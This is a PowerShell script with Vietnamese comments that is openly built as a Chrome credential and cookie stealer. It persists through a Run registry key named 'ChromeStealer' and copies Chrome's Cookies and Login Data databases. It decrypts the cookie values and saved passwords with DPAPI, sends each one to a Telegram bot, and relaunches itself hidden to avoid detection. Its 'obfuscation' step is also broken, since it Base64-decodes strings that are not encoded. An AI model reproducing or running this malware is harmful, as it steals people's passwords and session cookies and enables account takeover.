# Nạp thư viện SQLite nếu chưa có
$sqliteDllPath = "$env:APPDATA\System.Data.SQLite.dll"
if (-not (Test-Path $sqliteDllPath)) {
    Invoke-WebRequest -Uri "https://path-to-download/System.Data.SQLite.dll" -OutFile $sqliteDllPath
}

# Add System.Data.SQLite assembly (DLL)
Add-Type -Path $sqliteDllPath

# Obfuscation - Mã hóa các chuỗi quan trọng
$encodedTelegramToken = "7339660111:AAEYdZnK8grij4eeW0AY6ItxQ1SPpT5HR9c"
$encodedChatId = "4591159991"
$decodedToken = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedTelegramToken))
$decodedChatId = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedChatId))

# Telegram API URL
$telegramUrl = "https://api.telegram.org/bot$decodedToken/sendMessage"

# Bước 1: Thêm script vào registry để tự động chạy khi khởi động
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$scriptPath = "$env:APPDATA\my-script.ps1”
Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath
Set-ItemProperty -Path $regPath -Name "ChromeStealer" -Value $scriptPath

# Bước 2: Lấy cookie từ Chrome và giải mã
$cookiePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
$destCookiePath = "$env:APPDATA\chrome_cookies_copy"
Copy-Item -Path $cookiePath -Destination $destCookiePath

# Kết nối tới tệp SQLite
$conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$destCookiePath")
$conn.Open()
$cmd = $conn.CreateCommand()
$cmd.CommandText = "SELECT host_key, name, encrypted_value FROM cookies"
$reader = $cmd.ExecuteReader()

# Thu thập và giải mã cookie
while ($reader.Read()) {
    $host = $reader["host_key"]
    $name = $reader["name"]
    $encryptedValue = $reader["encrypted_value"]

    # Giải mã giá trị cookie bằng DPAPI
    $decryptedValue = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedValue, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

    # Gửi thông tin Cookie về Telegram
    $message = "Host: $host, Name: $name, Value: $decryptedValue"
    Invoke-RestMethod -Uri $telegramUrl -Method Post -ContentType "application/x-www-form-urlencoded" -Body @{chat_id = $decodedChatId; text = $message}
}
$conn.Close()

# Bước 3: Thu thập thông tin đăng nhập từ Chrome và giải mã
$loginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$destLoginData = "$env:APPDATA\chrome_login_copy"
Copy-Item -Path $loginDataPath -Destination $destLoginData

$conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$destLoginData")
$conn.Open()
$cmd = $conn.CreateCommand()
$cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
$reader = $cmd.ExecuteReader()

# Giải mã và gửi thông tin đăng nhập về Telegram
while ($reader.Read()) {
    $url = $reader["origin_url"]
    $username = $reader["username_value"]
    $encryptedPassword = $reader["password_value"]

    # Giải mã mật khẩu đã mã hóa
    $decryptedPassword = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedPassword, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

    # Gửi thông tin đăng nhập về Telegram
    $loginMessage = "URL: $url, Username: $username, Password: $decryptedPassword"
    Invoke-RestMethod -Uri $telegramUrl -Method Post -ContentType "application/x-www-form-urlencoded" -Body @{chat_id = $decodedChatId; text = $loginMessage}
}
$conn.Close()

# Chạy script ẩn để tránh bị phát hiện
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden

